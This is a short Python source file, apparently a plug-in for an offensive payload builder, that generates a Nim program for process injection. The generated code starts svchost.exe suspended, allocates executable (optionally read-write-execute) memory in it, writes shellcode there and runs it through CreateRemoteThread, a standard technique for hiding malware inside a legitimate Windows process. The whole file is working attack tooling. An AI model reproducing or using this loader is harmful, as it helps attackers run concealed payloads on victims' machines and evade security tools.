class spawnandinject:
    def __init__(self, arguments):
        if 'perm' in arguments:
            if arguments['perm'] == 'rwx':
                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
            else:
                self.memoryPermission = 'PAGE_EXECUTE_READ'

    def imports(self) -> list[str]:
        return ['import winim/lean']

    def compilerOptions(self) -> list[str]:
        return []

    def template(self, imports, codeblocks, transformers, shellcodeSize) -> str:
        return f"""
{imports}
{codeblocks}

proc main() =
    
    {transformers}

    var si: STARTUPINFOA
    var pi: PROCESS_INFORMATION

    si.cb = sizeof(si).DWORD

    CreateProcessA(nil, "C:\\\\windows\\\\system32\\\\svchost.exe", nil, nil, FALSE, CREATE_SUSPENDED, nil, nil, &si, &pi)

    let address = VirtualAllocEx(pi.hProcess, nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, {self.memoryPermission})
    WriteProcessMemory(pi.hProcess, address, addr(shellcode[0]), {shellcodeSize}, nil)
    let hThread = CreateRemoteThread(pi.hProcess, nil, 0.SIZE_T, cast[LPTHREAD_START_ROUTINE](address), nil, 0, nil)
    WaitForSingleObject(hThread, 500)
    CloseHandle(hThread)

main()
"""